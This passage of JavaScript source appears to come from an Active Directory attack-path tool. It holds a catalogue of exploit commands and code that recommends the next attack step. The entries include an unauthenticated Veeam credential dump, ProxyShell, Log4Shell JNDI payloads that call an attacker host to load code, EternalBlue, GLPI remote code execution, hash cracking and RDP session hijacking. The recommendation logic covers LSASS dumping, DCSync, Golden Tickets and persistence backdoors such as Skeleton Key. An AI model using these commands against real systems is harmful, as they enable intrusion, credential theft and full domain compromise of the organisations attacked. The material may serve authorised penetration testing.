failureIndicators:['Veeam Enterprise Manager not installed','Port 9443 not open','Version patched'],
notes:'CVE-2024-29849: Authentication bypass in Veeam Backup Enterprise Manager (VBEM). An attacker can impersonate any user and authenticate to the web console without credentials. Once authenticated as admin, full backup infrastructure access is possible — including backup files containing credential snapshots of every protected machine. VBEM is a separate component from Backup and Replication. Affects versions before 12.1.2.172. Port 9443 is VBEM HTTPS. A successful bypass returns a JWT token usable for all subsequent API calls.'},
{id:'CVE_016',phase:'credential-access',title:'Veeam Creds Dump CVE-2023-27532',desc:'Extract cleartext credentials from Veeam database without authentication',tool:'curl',os:'linux',noise:'med',auth:'none',
cmd:"curl -sk 'https://{TARGET_IP}:9401/api/credentials'\nnmap -p 9401 {TARGET_IP}",
failureIndicators:['Port 9401 not accessible','Veeam service not running','Version patched (12.0.0.1420+)'],
notes:'CVE-2023-27532: Unauthenticated access to a Veeam catalogue service API endpoint that exposes all credentials stored in the Veeam configuration database in cleartext. These credentials are what Veeam uses to connect to backed-up machines: domain admin accounts, ESXi root, SQL SA accounts, NAS credentials, cloud keys. A single request returns everything. Affects Veeam B&R before 12.0.0.1420 (March 2023 patch). Port 9401 is the Veeam catalogue service. If you find a Veeam server in scope, always check this first.'},
{id:'CVE_017',phase:'privilege-escalation',title:'Exchange ProxyShell (CVE-2021-34473/34523/31206)',desc:'Pre-auth RCE chain on Exchange: SSRF + privilege escalation + arbitrary file write',tool:'Metasploit',os:'linux',noise:'high',auth:'none',
cmd:"curl -sk 'https://{TARGET_IP}/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com'\nmsf> use exploit/windows/http/exchange_proxyshell_rce\nmsf> set RHOSTS {TARGET_IP}\nmsf> run",
failureIndicators:['Exchange patched (August 2021 CU or later)','WAF blocking requests','IIS rewrite rules blocking'],
notes:'ProxyShell chains three CVEs for pre-auth RCE on Exchange: CVE-2021-34473 (SSRF via URL confusion bypass), CVE-2021-34523 (elevated privilege on Exchange PowerShell backend), CVE-2021-31206 (arbitrary file write via PowerShell push subscriptions). Result: SYSTEM shell on the Exchange server, which has WriteDACL on the domain (Exchange Windows Permissions group). From Exchange SYSTEM, grant DCSync rights: Add-DomainObjectAcl -TargetIdentity {BASE_DN} -PrincipalIdentity EXCHANGE_SERVER$ -Rights DCSync. Verify: curl -sk https://{TARGET_IP}/autodiscover/autodiscover.json should respond with Exchange data.'},
{id:'CVE_018',phase:'privilege-escalation',title:'Log4Shell CVE-2021-44228',desc:'JNDI injection via Log4j2 for RCE on any Java application logging user-controlled input',tool:'JNDI-exploit-kit',os:'linux',noise:'high',auth:'none',
cmd:"curl -H 'X-Api-Version: ${jndi:ldap://{ATTACKER_IP}:{LPORT}/o=reference}' http://{TARGET_IP}/\ncurl -A '${jndi:ldap://{ATTACKER_IP}:{LPORT}/a}' http://{TARGET_IP}/\njava -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://{ATTACKER_IP}:{LPORT}/#Exploit'",
failureIndicators:['Log4j version 2.17.1+ (patched)','Outbound LDAP/DNS blocked','Java version mitigates JNDI'],
notes:'Log4Shell: any string logged by Log4j2 that contains ${jndi:ldap://...} triggers an outbound LDAP lookup. Inject in HTTP headers (User-Agent, X-Forwarded-For, Authorization, X-Api-Version), POST bodies, usernames, or any logged field. The JNDI lookup fetches a Java class from the attacker LDAP server and executes it. Scope: any application using Log4j2 version 2.0-beta9 through 2.14.1. High-value targets: VMware vCenter, ManageEngine, Confluence, Cisco products, SIEMs. DNS callback first: ${jndi:dns://{ATTACKER_IP}/test} to confirm the injection works before attempting RCE.'},
{id:'CVE_019',phase:'privilege-escalation',title:'EternalBlue MS17-010 (SMBv1 RCE)',desc:'Remote code execution via SMBv1 buffer overflow — yields SYSTEM without authentication',tool:'AutoBlue/Metasploit',os:'linux',noise:'high',auth:'none',
cmd:"nmap -p 445 --script smb-vuln-ms17-010 {TARGET_IP}\npython3 checker.py {TARGET_IP}\npython3 zzz_exploit.py {TARGET_IP} {SHARE}",
failureIndicators:['SMBv1 disabled','Patched (March 2017 or later)','Firewall blocks port 445'],
notes:'EternalBlue exploits a buffer overflow in SMBv1 transaction processing. No authentication required. Results in SYSTEM-level code execution. Still found in: Windows 7/2008 R2 that missed the March 2017 patch, isolated OT/ICS networks, some legacy printers and NAS devices. Verify with nmap smb-vuln-ms17-010 BEFORE exploiting — the exploit itself can BSOD unpatched systems. The AutoBlue Python tools (github.com/3ndG4me/AutoBlue-MS17-010) work without Metasploit. After exploitation: dump SAM, add user, or deploy persistent shell.'},
{id:'CVE_020',phase:'privilege-escalation',title:'GLPI RCE CVE-2022-35914 / SQLi CVE-2023-41320',desc:'Pre-auth PHP injection RCE or authenticated SQLi in GLPI IT asset management',tool:'curl',os:'linux',noise:'high',auth:'none',
cmd:"# CVE-2022-35914 (pre-auth RCE via htmlawed PHP injection):\ncurl 'http://{TARGET_IP}/glpi/vendor/htmlawed/htmlawed/htmLawedTest.php' \\\n  --data-urlencode 'text=<div>test</div>' \\\n  --data 'hhook=exec&sid=test&spec=0'\nnmap -p 80,443 {TARGET_IP}",
failureIndicators:['GLPI version patched','PHP exec disabled','WAF blocking','Test file removed'],
notes:'GLPI is popular open-source IT asset management widely deployed in enterprise environments. CVE-2022-35914: Pre-auth RCE via the htmlawed PHP library test file — no login required, just a POST to htmLawedTest.php with hhook=exec. CVE-2023-41320: SQL injection in the authenticated API. GLPI databases contain: all IT assets, VPN credentials, database connection strings, LDAP bind credentials, admin passwords. From GLPI RCE, read config/config_db.php for database credentials, then enumerate LDAP settings for domain bind credentials. Check: curl -I http://{TARGET_IP}/glpi/ to confirm GLPI is running.'},
{id:'HASH_015',phase:'credential-access',title:'Hashcat SCCM PXE Hash (mode 19850)',desc:'Crack SCCM PXE media password hash extracted from boot.var',tool:'Hashcat',os:'both',noise:'low',auth:'none',
cmd:"hashcat -m 19850 sccm_pxe_hash.txt {WORDLIST}\nhashcat -m 19850 sccm_pxe_hash.txt -a 3 ?u?l?l?l?d?d?d?d\nhashcat -m 19850 sccm_pxe_hash.txt -r /usr/share/hashcat/rules/best64.rule {WORDLIST}",
failureIndicators:['Hash format incorrect (not sccm$aes128$)','No GPU available','Wordlist insufficient'],
notes:'SCCM PXE hashes extracted by pxethief.py are in $sccm$aes128$ format. Hashcat mode 19850 handles this. Approach: (1) Common enterprise passwords — Season+Year+! combinations (Winter2024!, Spring2024!), (2) Company name + year, (3) Brute force short passwords since PXE media passwords are often set by admins using simple words. A cracked PXE hash grants access to the PXE boot environment and the NAA credentials stored inside the SCCM media. Requires hashcat 6.2.6+. Also try: hashcat mode 19850 with -a 6 (hybrid wordlist+mask) for common base+number patterns.'},
{id:'HASH_016',phase:'credential-access',title:'Hashcat TimeRoast Hash (mode 31300)',desc:'Crack SNTP-MS machine account hashes from TimeRoasting',tool:'Hashcat',os:'both',noise:'low',auth:'none',
cmd:"hashcat -m 31300 timeroast_hashes.txt {WORDLIST}\nhashcat -m 31300 timeroast_hashes.txt -r /usr/share/hashcat/rules/best64.rule {WORDLIST}",
failureIndicators:['No GPU','Machine account has auto-generated 120-char password','Mode not in old hashcat'],
notes:'TimeRoast hashes are $sntp-ms$ format — hashcat mode 31300. Machine account passwords are automatically set to 120 random characters and are essentially uncrackable. However: some environments have legacy machine accounts with manually set passwords, or machines added with a simple password during imaging that was never changed. If you crack any machine account NT hash, use it directly for Silver Tickets against that machine. Requires hashcat 6.2.6 or later. The TimeRoasting technique is most valuable for discovery — even if the hash is not crackable, you confirm the machine account exists and get its SID.'},
{id:'HASH_017',phase:'credential-access',title:'Hashcat NTLMv1 + crack.sh (mode 5500)',desc:'Crack NTLMv1 hashes — instant NT hash extraction via crack.sh with fixed challenge',tool:'Hashcat/crack.sh',os:'both',noise:'low',auth:'none',
cmd:"# Hashcat NTLMv1-SSP (mode 5500):\nhashcat -m 5500 ntlmv1_hash.txt {WORDLIST}\n# With fixed challenge 1122334455667788 — submit to crack.sh for instant result\n# Format: username::hostname:LMresponse:NTresponse:challenge",
failureIndicators:['NTLMv2 used instead of NTLMv1','Random challenge captured (not 1122334455667788)','crack.sh rate limit'],
notes:'NTLMv1 is drastically weaker than NTLMv2. If Responder captures NTLMv1 hashes (visible as shorter responses in Responder logs), the attack is: (1) Set Challenge=1122334455667788 in /etc/responder/Responder.conf BEFORE capturing, (2) With this fixed challenge, the NTLMv1 response maps DIRECTLY to the NT hash via rainbow tables, (3) Submit the capture to crack.sh (free service) and get the raw NT hash in seconds — no GPU needed. The NT hash can then be used for PTH everywhere. NTLMv1 is disabled in modern Windows but may be forced on by legacy apps or misconfigured GPO (LmCompatibilityLevel < 3).'},
{id:'HASH_018',phase:'credential-access',title:'Hashcat Kerberos TGS AES-128/256 (modes 19600/19700)',desc:'Crack AES-encrypted Kerberoast TGS tickets — slower than RC4 but sometimes unavoidable',tool:'Hashcat/Rubeus',os:'both',noise:'low',auth:'none',
cmd:"# AES-128 (etype 17):\nhashcat -m 19600 tgs_aes128.txt {WORDLIST}\n# AES-256 (etype 18):\nhashcat -m 19700 tgs_aes256.txt {WORDLIST}\n# Downgrade to RC4 first (faster to crack):\n.\\Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:tgs_rc4.txt",
failureIndicators:['AES too slow to crack with available GPU','Account has strong password','Downgrade blocked by KDC'],
notes:'Modern AD environments issue AES-encrypted TGS tickets instead of RC4. AES is 4-10x slower to crack than RC4. Mode 19600 = AES-128 (etype 17), mode 19700 = AES-256 (etype 18). Mitigation: use Rubeus kerberoast /tgtdeleg /rc4opsec to request RC4-encrypted tickets (etype 23) even when AES is configured — this uses a TGT delegation trick to force RC4 issuance. Mode 13100 is standard RC4 TGS. Always check the hash prefix to identify encryption type before selecting mode: $krb5tgs$23$ = RC4, $krb5tgs$17$ = AES-128, $krb5tgs$18$ = AES-256.'},
{id:'IMPERS_001',phase:'lateral-movement',title:'Impersonate RDP Session (tscon)',desc:'Hijack an existing RDP or console session of another user without their password',tool:'tscon/psexec',os:'windows',noise:'med',auth:'required',
cmd:"query user\nquery session\n# Run the following AS SYSTEM:\npsexec.exe -s -i cmd\ntscon.exe {SESSION_ID} /dest:{YOUR_SESSION_NAME}",
failureIndicators:['Not running as SYSTEM','Target session actively in use','Terminal Services not running'],
notes:'tscon.exe is a Windows built-in that switches between RDP and console sessions. Running it AS SYSTEM allows connecting to any session without a password — including locked sessions. Enumerate sessions first: query user (shows session IDs and states). Escalate to SYSTEM (via psexec -s, SeDebugPrivilege token theft, or PrintSpoofer), then tscon {SESSION_ID}. This silently takes over the session — you see their open desktop, running applications, open SSH sessions, password managers, everything. No login event is generated. Particularly valuable on jump hosts and RDP gateway servers with multiple admin sessions.'},
{id:'IMPERS_002',phase:'lateral-movement',title:'irs.exe — Impersonate Running Session by PID',desc:'Execute commands in the context of other logged-in users by stealing their process tokens',tool:'impersonate-rs',os:'windows',noise:'med',auth:'required',
cmd:".\\irs.exe list\n.\\irs.exe exec -p <pid> -c \"whoami /all\"",
failureIndicators:['SeImpersonatePrivilege required','No other users logged in','AV detection of irs.exe'],
notes:'irs.exe (impersonate-rs) enumerates all running processes and their associated user tokens, then allows running commands in the context of any logged-in user without their password. Requires SeImpersonatePrivilege (available to service accounts, IIS app pools, SQL Server service accounts, and accounts with local admin). list shows all sessions and PIDs. exec -p {pid} creates a process using that process token. Much more targeted than generic token impersonation — you choose exactly which user context. Very useful on terminal servers or jump hosts with multiple concurrent user sessions.'},
{id:'IMPERS_003',phase:'privilege-escalation',title:'Impersonate via ADCS Certificate (PKINIT)',desc:'Use a certificate obtained for another user to impersonate them via Kerberos PKINIT',tool:'Certipy/Rubeus',os:'both',noise:'low',auth:'required',
cmd:"# Obtain a cert for target user (requires ESC1/4/6 or GenericWrite on account):\ncertipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template {TEMPLATE_NAME} -upn {TARGET_USER}@{DOMAIN}\n# Impersonate on Linux:\ncertipy auth -pfx {TARGET_USER}.pfx -dc-ip {DC_IP}\n# Impersonate on Windows:\n.\\Rubeus.exe asktgt /user:{TARGET_USER} /certificate:{TARGET_USER}.pfx /domain:{DOMAIN} /dc:{DC_IP} /show /ptt",
failureIndicators:['No vulnerable ADCS template','PKINIT not enabled on account','Smart card logon required on account'],
notes:'Certificate-based impersonation via PKINIT is stealthy and durable. Once you have a certificate with the target user UPN in the SAN (from ESC1, ESC4, ESC6, or GenericWrite), certipy auth performs Kerberos PKINIT: certificate TGT as that user, then UnPAC-the-hash extracts the NTLM hash. No password needed, no brute force, minimal Kerberos noise. The certificate is valid for the template lifetime — often 1 to 10 years — so this access persists even through password changes. The NTLM hash from UnPAC-the-hash works for PTH until the password changes. This is why ADCS misconfigurations are so critical.'},

// ── Smart Recommendations Engine ────────────────────────────────────────────────────────
function getSmartRecommendations() {
    if (!hasAnyState()) return [];
    const priv   = getPrivLevel();
    const cred   = STATE.credentialType;
    const id     = STATE.identityPresence;
    const access = STATE.accessPosition;
    const env    = STATE.environmentContext;
    const hasAuth = id && id !== 'none' && cred && cred !== 'none';
    const isInt   = access && access !== 'external';
    const recs    = [];

    // ── No foothold yet ─────────────────────────────────────────────────────
    if (!hasAuth && priv === 0) {
        if (isInt) {
            recs.push({title:'LLMNR/NBT-NS Poisoning (Responder)',      why:'Passive hash capture on LAN — highest chance of quick win', phase:'reconnaissance',     priority:'high', filter:'recon'});
            recs.push({title:'NULL Session Enumeration',                  why:'Map users/policy without credentials', phase:'enumeration',          priority:'high', filter:'enumeration'});
            recs.push({title:'AS-REP Roasting without credentials',       why:'Offline-crack TGTs for accounts without pre-auth', phase:'credential-access', priority:'high', filter:'credential-access'});
            recs.push({title:'Password Spraying (policy-safe)',           why:'Test weak passwords across all users — check lockout first', phase:'credential-access', priority:'med',  filter:'credential-access'});
            recs.push({title:'Kerbrute User Enumeration',                 why:'Confirm valid usernames without authentication', phase:'enumeration',          priority:'med',  filter:'enumeration'});
        } else {
            recs.push({title:'DNS & Network Reconnaissance',              why:'Identify DC, domain name, internal ranges', phase:'reconnaissance',     priority:'high', filter:'recon'});
            recs.push({title:'OSINT / Email Harvesting → Spray',          why:'Build username list from public data before attacking', phase:'reconnaissance',     priority:'med',  filter:'recon'});
        }
    }

    // ── Standard domain user ─────────────────────────────────────────────────
    if (hasAuth && priv <= 1) {
        recs.push({title:'BloodHound Collection (DO THIS FIRST)',         why:'Graph every attack path — essential baseline for all decisions', phase:'enumeration',      priority:'high', filter:'enumeration'});
        recs.push({title:'Kerberoasting — Request Service TGS',           why:'Get offline-crackable tickets for service accounts', phase:'credential-access', priority:'high', filter:'credential-access'});
        recs.push({title:'ACL Abuse Enumeration (PowerView)',              why:'Find GenericWrite / GenericAll / WriteDACL → privilege path', phase:'enumeration',      priority:'high', filter:'enumeration'});
        recs.push({title:'Find Local Admin Access Across Domain',          why:'Find hosts where your creds give admin — pivot point', phase:'enumeration',      priority:'high', filter:'enumeration'});
        recs.push({title:'AS-REP Roasting with credentials',              why:'Identify pre-auth disabled users with your domain creds', phase:'credential-access', priority:'med',  filter:'credential-access'});
        recs.push({title:'Unconstrained Delegation Host Enumeration',      why:'Compromising one of these captures any user TGT', phase:'enumeration',      priority:'med',  filter:'enumeration'});
        recs.push({title:'Password in User Descriptions / Notes',          why:'Admins sometimes store passwords in AD description fields', phase:'enumeration',      priority:'med',  filter:'enumeration'});
        recs.push({title:'GPP cpassword (SYSVOL)',                         why:'Check SYSVOL for old Group Policy preference password blobs', phase:'credential-access', priority:'med',  filter:'credential-access'});
    }

    // ── ACL path available ───────────────────────────────────────────────────
    if (priv === 2) {
        recs.push({title:'Shadow Credentials via GenericWrite',            why:'Add shadow cert to target → get NTLM hash without changing password', phase:'privilege-escalation', priority:'high', filter:'privilege-escalation'});
        recs.push({title:'Targeted Kerberoasting via WriteSPN',            why:'Set fake SPN → kerberoast → crack → remove SPN (silent)', phase:'privilege-escalation', priority:'high', filter:'privilege-escalation'});
        recs.push({title:'WriteDACL → Grant DCSync Rights',                why:'Write DCSync ACE on domain root → dump all hashes', phase:'privilege-escalation', priority:'high', filter:'privilege-escalation'});
        recs.push({title:'ForceChangePassword / Set-DomainUserPassword',   why:'Reset target account password if you hold this right', phase:'privilege-escalation', priority:'med',  filter:'privilege-escalation'});
        recs.push({title:'GenericAll → Add to Domain Admins',              why:'Full control: add user to DA group directly', phase:'privilege-escalation', priority:'high', filter:'privilege-escalation'});
    }

    // ── Local admin on one host ──────────────────────────────────────────────
    if (priv === 3) {
        recs.push({title:'LSASS Dump → Credential Extraction',             why:'Cached domain creds + DA sessions often on member servers', phase:'credential-access', priority:'high', filter:'credential-access'});
        recs.push({title:'SAM + LSA Secrets Dump',                         why:'Local account hashes + cached domain credentials', phase:'credential-access', priority:'high', filter:'credential-access'});
        recs.push({title:'DPAPI — SharpDPAPI / DonPAPI',                   why:'Browser passwords, Credential Manager, scheduled task creds', phase:'credential-access', priority:'high', filter:'credential-access'});
        recs.push({title:'LaZagne — Multi-App Credential Harvest',          why:'60+ applications scanned for stored credentials', phase:'credential-access', priority:'med',  filter:'credential-access'});
        recs.push({title:'Find Active Domain Admin Sessions',              why:'Use BloodHound or netstat to locate DA-session hosts', phase:'enumeration',      priority:'high', filter:'enumeration'});
        recs.push({title:'Pass-the-Hash Lateral Movement',                  why:'Reuse extracted hashes to pivot to other admin hosts', phase:'lateral-movement',  priority:'high', filter:'lateral-movement'});
    }

    // ── Local admin multiple hosts ───────────────────────────────────────────
    if (priv === 4) {
        recs.push({title:'Network-wide LSASS Dump (nxc lsassy)',           why:'Mass-dump LSASS across all admin hosts — find DA creds', phase:'credential-access', priority:'high', filter:'credential-access'});
        recs.push({title:'Network-wide SAM Dump (nxc --sam)',              why:'Harvest local admin hashes from every reachable host', phase:'credential-access', priority:'high', filter:'credential-access'});
        recs.push({title:'Check Constrained Delegation (if service acct)', why:'S4U2Proxy to impersonate DA on target service', phase:'lateral-movement',  priority:'med',  filter:'lateral-movement'});
        recs.push({title:'DCSync if any host has NTDS access',             why:'Check if any compromised account has replication rights', phase:'domain-dominance',  priority:'high', filter:'domain-dominance'});
    }

    // ── DCSync rights ────────────────────────────────────────────────────────
    if (priv === 5) {
        recs.push({title:'DCSync — Dump krbtgt + All Domain Hashes',       why:'Extract everything: krbtgt for Golden Ticket, all user hashes', phase:'domain-dominance', priority:'high', filter:'domain-dominance'});
        recs.push({title:'Golden Ticket Forgery',                           why:'Forge 10-year tickets with krbtgt hash — permanent DA access', phase:'domain-dominance', priority:'high', filter:'domain-dominance'});
    }

    // ── Domain Admin ─────────────────────────────────────────────────────────
    if (priv >= 6) {
        recs.push({title:'DCSync → Golden Ticket (Persistence)',            why:'krbtgt hash → forge tickets that survive password resets', phase:'domain-dominance', priority:'high', filter:'domain-dominance'});
        recs.push({title:'AdminSDHolder Backdoor (Stealthy Persistence)',   why:'ACE survives AdminSDHolder resync — outlasts DA group membership', phase:'persistence',      priority:'high', filter:'persistence'});
        recs.push({title:'Child→Parent Domain via ExtraSIDs Trust Attack',  why:'If this is a child domain, own the parent forest root', phase:'domain-dominance', priority:'high', filter:'domain-dominance'});
        recs.push({title:'DSRM Local Admin Backdoor',                       why:'Enable DSRM account for persistent offline DC access', phase:'persistence',      priority:'med',  filter:'persistence'});
        recs.push({title:'Skeleton Key (Patch DC LSASS)',                   why:'Universal password on DC — survives all account changes', phase:'persistence',      priority:'med',  filter:'persistence'});
    }

    // ── Credential-type specific suggestions (prepended — these appear first) ─
    const credRecs = [];
    if (cred === 'ntlm-hash') {
        credRecs.push({title:'Overpass-the-Hash → Get a TGT',              why:'Convert NTLM hash to full Kerberos TGT (more stealthy)', phase:'lateral-movement',  priority:'high', filter:'lateral-movement'});
        credRecs.push({title:'Pass-the-Hash → Lateral Movement',           why:'Directly authenticate to SMB/WMI/RPC with NTLM hash', phase:'lateral-movement',  priority:'high', filter:'lateral-movement'});
    }
    if (cred === 'certificate') {
        credRecs.push({title:'PKINIT Auth → TGT from Certificate',         why:'Use certificate to get TGT → full Kerberos access', phase:'credential-access', priority:'high', filter:'credential-access'});
        credRecs.push({title:'UnPAC the Hash (cert → NTLM via PKINIT)',    why:'Extract NTLM hash from PKINIT → enables PTH lateral movement', phase:'credential-access', priority:'high', filter:'credential-access'});
        credRecs.push({title:'Pass-the-Cert → LDAP (DCSync ACE)',          why:'Use cert directly for LDAP — grant DCSync ACE to own user', phase:'privilege-escalation', priority:'high', filter:'privilege-escalation'});
    }
    if (cred === 'tgt') {
        credRecs.push({title:'Pass-the-Ticket → Session Impersonation',    why:'Inject TGT into current session — acts as that user everywhere', phase:'lateral-movement', priority:'high', filter:'lateral-movement'});
        credRecs.push({title:'S4U2Self (if service account TGT)',           why:'Impersonate any user to the service account host', phase:'lateral-movement', priority:'med',  filter:'lateral-movement'});
    }
    if (cred === 'aes-key') {
        credRecs.push({title:'Overpass-the-Hash with AES Key',             why:'AES key → request TGT without touching NTLM (stealthier)', phase:'lateral-movement', priority:'high', filter:'lateral-movement'});
    }
    if (cred === 'tgs') {
        credRecs.push({title:'Crack TGS Offline (Hashcat)',                why:'Crack RC4 service ticket hash offline — common with kerberoasting output', phase:'credential-access', priority:'high', filter:'credential-access'});
    }

    // Merge: cred-specific first, then priv-based, deduplicate, slice to 6
    const combined = [...credRecs, ...recs];
    const seen = new Set();
    const deduped = combined.filter(r => {
        if (seen.has(r.title)) return false;
        seen.add(r.title);
        return true;
    });
    return deduped.slice(0, 6);
}

const PRIV_LEVELS = {
    'unauthenticated':0, 'authenticated-standard':1, 'authenticated-acl-path':2,
    'local-admin-single':3, 'local-admin-multiple':4,
    'has-dcsync-rights':5, 'domain-admin-equivalent':6, 'tier0-control':7
};

function getPrivLevel() { return PRIV_LEVELS[STATE.privilegeCapability] || 0; }
function hasAnyState()  { return Object.values(STATE).some(v => v !== null); }

// Returns {state:'active'|'possible'|'locked', reason:string}
function getCommandRelevance(cmd) {
    if (MODE === 'expert' || !hasAnyState()) return {state:'active'};

    const priv   = getPrivLevel();
    const cred   = STATE.credentialType;
    const id     = STATE.identityPresence;
    const access = STATE.accessPosition;
    const opsec  = STATE.opsecPosture;
    const env    = STATE.environmentContext;
    const ct     = cmd.cmd.toLowerCase();

    const hasNoCred = !id || id === 'none' || !cred || cred === 'none';
    const hasAuth   = id && id !== 'none' && cred && cred !== 'none';

    // ── 1. OPSEC gate (always first) ────────────────────────────────────────
    if (opsec === 'opsec-critical' && cmd.noise === 'high')
        return {state:'locked',   reason:'Too noisy (OPSEC Critical)'};
    if (opsec === 'opsec-preferred' && cmd.noise === 'high')
        return {state:'possible', reason:'High noise — use only when necessary'};

    // ── 2. Auth check (no creds → guide toward getting creds, never dead-end)
    if (cmd.auth === 'required' && hasNoCred) {
        // Late-stage phases: always show as possible goals regardless of network position
        // (internal should never appear worse than external)
        if (cmd.phase === 'lateral-movement' || cmd.phase === 'persistence' || cmd.phase === 'domain-dominance')
            return {state:'possible', reason: access === 'external'
                ? 'Needs internal network access + valid credentials'
                : 'Needs valid credentials first'};
        // Credential-access: show as possible goal for any position (immediate next step)
        if (cmd.phase === 'credential-access')
            return {state:'possible', reason: access === 'external'
                ? 'Needs internal access or VPN'
                : 'Needs valid credentials (use auth=none commands first)'};
        return {state: priv > 0 ? 'possible' : 'locked', reason:'Needs valid credentials'};
    }

    // ── 3. External position — show internal-only phases as possible (not locked)
    //    (must come before phase-level gates so we show progress, not dead-ends)
    if (access === 'external') {
        if (cmd.phase === 'lateral-movement' || cmd.phase === 'persistence')
            return {state:'possible', reason:'Needs internal network access first'};
        if (cmd.phase === 'credential-access' && cmd.auth === 'required')
            return {state:'possible', reason:'Needs internal access or VPN'};
    }

    // ── 4. OS / environment mismatch ────────────────────────────────────────
    if (env === 'linux'   && cmd.os === 'windows')
        return {state:'possible', reason:'Windows-only — run from compromised Windows host'};
    if (env === 'windows' && cmd.os === 'linux')
        return {state:'possible', reason:'Linux-only — run from attack box'};

    // ── 5. Phase-level privilege gates ──────────────────────────────────────
    if (cmd.phase === 'domain-dominance') {
        // Trust attacks (child→parent) need full DA on child first
        if (['TRUST_ATK_001','TRUST_ATK_002'].includes(cmd.id)) {
            if (priv < 6) return {state: priv >= 5 ? 'possible' : 'locked', reason:'Needs Domain Admin on child domain first'};
        } else {
            if (priv < 5) return {state: priv >= 2 ? 'possible' : 'locked', reason:'Needs DA or DCSync rights'};
        }
    }
    if (cmd.phase === 'persistence') {
        // DA-required persistence commands: visible as possible for any authenticated user (shows the goal)
        const needsDA = ['PERSIST_001','PERSIST_002','PERSIST_003','PERSIST_004','PERSIST_005'].includes(cmd.id);
        if (needsDA && priv < 6) return {state: hasAuth ? 'possible' : 'locked', reason:'Needs Domain Admin'};
        // Only gate auth-required persistence on privilege; auth=none (e.g. registry) stays visible
        if (cmd.auth === 'required' && !needsDA && priv < 3) return {state: hasAuth ? 'possible' : 'locked', reason:'Needs local admin or higher'};
    }
    if (cmd.phase === 'lateral-movement') {
        // Only lock auth-required lateral movement when no creds; tunneling tools (auth=none) are always accessible
        if (cmd.auth === 'required' && !hasAuth && priv < 1)
            return {state:'locked', reason:'Needs credentials first'};
        // Admin-level lateral movement tools need local admin on target
        const needsAdmin = ct.includes('psexec') || ct.includes('wmiexec') ||
                           ct.includes('secretsdump') || ct.includes('dcomexec') || ct.includes('atexec') ||
                           ct.includes('--sam') || ct.includes('--lsa') || ct.includes('--ntds');
        if (needsAdmin && priv < 3)
            return {state: hasAuth ? 'possible' : 'locked', reason:'Needs local admin on target'};
    }
    if (cmd.phase === 'privilege-escalation' && hasNoCred && !access)
        return {state:'locked', reason:'Needs a foothold first'};

    // ── 6. Tool-specific privilege gates ────────────────────────────────────
    // DPAPI commands need local admin
    const isDPAPI = cmd.id.startsWith('DPAPI_') || ct.includes('sharpdpapi') || ct.includes('donpapi') || ct.includes('dpapi::');
    if (isDPAPI && priv < 3)
        return {state: hasAuth ? 'possible' : 'locked', reason:'Needs local admin on target host'};

    // Targeted kerberoasting requires WriteSPN / GenericWrite ACL path
    if (cmd.id === 'TARGETED_KERB_001' && priv < 2)
        return {state: hasAuth ? 'possible' : 'locked', reason:'Needs GenericWrite/WriteSPN ACL on target'};

    // ── 7. Credential-type specific gates ───────────────────────────────────
    // PTH: command is hash-exclusive (doesn't also offer a password form)
    const isPTH = (ct.includes('-hashes') || ct.includes('/ntlm:') || ct.includes('--hashes') || ct.includes('--hash ')) &&
                  !ct.includes('{password}'); // commands with BOTH options are not PTH-exclusive
    if (isPTH && cred && !['ntlm-hash','aes-key'].includes(cred))
        return {state:'possible', reason:'Needs NTLM hash'};

    const isCert = cmd.id.startsWith('ESC_') || cmd.id.startsWith('ADCS_') || cmd.id.startsWith('SHADOW_') ||
                   ct.includes('certipy') || ct.includes('passthecert') || ct.includes('whisker');
    if (isCert && cred && !['certificate','password','ntlm-hash'].includes(cred))
        return {state:'possible', reason:'Needs certificate or domain credentials'};

    // Pass-the-Cert specifically needs a .pfx certificate
    if ((ct.includes('passthecert') || cmd.id.includes('PASSTHECERT')) && cred && cred !== 'certificate')
        return {state:'possible', reason:'Needs a certificate (.pfx) first'};

    // Certificate-only: password/hash lateral movement needs cert→NTLM/TGT conversion first
    if (cred === 'certificate' && cmd.phase === 'lateral-movement') {
        const isCertNative = ct.includes('kerberos') || ct.includes('ccache') || ct.includes('pkinit') ||
                             ct.includes('-k ') || ct.includes('certipy');
        if (!isCertNative)
            return {state:'possible', reason:'Certificate needs PKINIT → TGT/NTLM conversion first (ADCS_001/ADCS_002)'};
    }

    // ── 8. Username / identity gates ────────────────────────────────────────
    const isASREP = ct.includes('asreproast') || ct.includes('asrep') || cmd.id.includes('ASREP');
    if (isASREP && (!id || id === 'none')) return {state:'locked', reason:'Needs at least a username list'};

    const isKerb = ct.includes('kerberoast') || ct.includes('getuserspns') || cmd.id.includes('KERB');
    if (isKerb && hasNoCred) return {state:'locked', reason:'Needs domain user credentials'};

    // Coercion attacks need domain creds (can't coerce anonymously)
    const isCoerce = ct.includes('coercer') || ct.includes('petitpotam') || ct.includes('dfscoerce') || ct.includes('printerbug');
    if (isCoerce && hasNoCred) return {state:'possible', reason:'Needs domain credentials for coercion'};

    return {state:'active'};
}

// Per-phase unlock status for the attack path sidebar
function getPhaseStatus(phaseId) {
    const priv    = getPrivLevel();
    const hasAuth = STATE.identityPresence && STATE.identityPresence !== 'none' &&
                    STATE.credentialType   && STATE.credentialType   !== 'none';
    const isInt   = STATE.accessPosition && STATE.accessPosition !== 'external';

    const map = {
        'tool-setup':           {ok:true,          need:null},
        'reconnaissance':       {ok:true,          need:null},
        'enumeration':          {ok:hasAuth||isInt, need:'Get credentials or internal access'},
        'credential-access':    {ok:isInt,          need:'Gain internal network access'},
        'privilege-escalation': {ok:hasAuth||priv>0,need:'Get any foothold first'},
        'defense-evasion':      {ok:hasAuth||priv>0,need:'Get a foothold'},
        'lateral-movement':     {ok:hasAuth,         need:'Get valid credentials first'},
        'persistence':          {ok:priv>=3,        need:'Need local admin (host) or DA (domain)'},
        'domain-dominance':     {ok:priv>=5,        need:'Need Domain Admin or DCSync rights'}
    };
    return map[phaseId] || {ok:false, need:'Unknown'};
}

function loadState() {
    try {
        const saved = localStorage.getItem('adEngineStateV4');
        if (saved) Object.assign(STATE, JSON.parse(saved));
        const savedCfg = localStorage.getItem('adEngineConfigV4');
        if (savedCfg) Object.assign(CONFIG, JSON.parse(savedCfg));
        // Populate config inputs
        document.querySelectorAll('.config-field input').forEach(el => {
            const key = el.id.replace('cfg', '');
            const configKey = key.replace(/([A-Z])/g, '_$1').toUpperCase().replace(/^_/, '');
